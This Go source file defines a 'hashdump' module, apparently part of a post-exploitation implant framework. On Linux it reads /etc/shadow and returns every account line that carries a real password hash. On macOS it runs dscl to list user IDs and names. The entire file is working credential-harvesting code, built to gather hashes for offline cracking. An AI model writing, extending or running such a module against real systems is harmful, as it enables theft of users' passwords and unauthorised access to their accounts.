package modules

import (
	"fmt"
	"os"
	"runtime"
	"strings"
)

type HashDump struct{}

func (m *HashDump) Name() string        { return "hashdump" }
func (m *HashDump) Description() string { return "Dump password hashes (/etc/shadow)" }

func (m *HashDump) Run(args []string) ([]byte, error) {
	switch runtime.GOOS {
	case "linux":
		return m.linuxDump()
	case "darwin":
		return m.darwinDump()
	default:
		return nil, fmt.Errorf("hashdump not supported on %s", runtime.GOOS)
	}
}

func (m *HashDump) linuxDump() ([]byte, error) {
	data, err := os.ReadFile("/etc/shadow")
	if err != nil {
		return nil, fmt.Errorf("read /etc/shadow: %w (requires root)", err)
	}

	var sb strings.Builder
	for _, line := range strings.Split(string(data), "\n") {
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ":", 3)
		if len(parts) < 2 {
			continue
		}
		if parts[1] == "*" || parts[1] == "!" || parts[1] == "!!" {
			continue
		}
		sb.WriteString(line)
		sb.WriteByte('\n')
	}

	if sb.Len() == 0 {
		return []byte("no password hashes found\n"), nil
	}
	return []byte(sb.String()), nil
}

func (m *HashDump) darwinDump() ([]byte, error) {
	return execCommandOutput("dscl", ".", "-readall", "/Users", "GeneratedUID", "RealName")
}
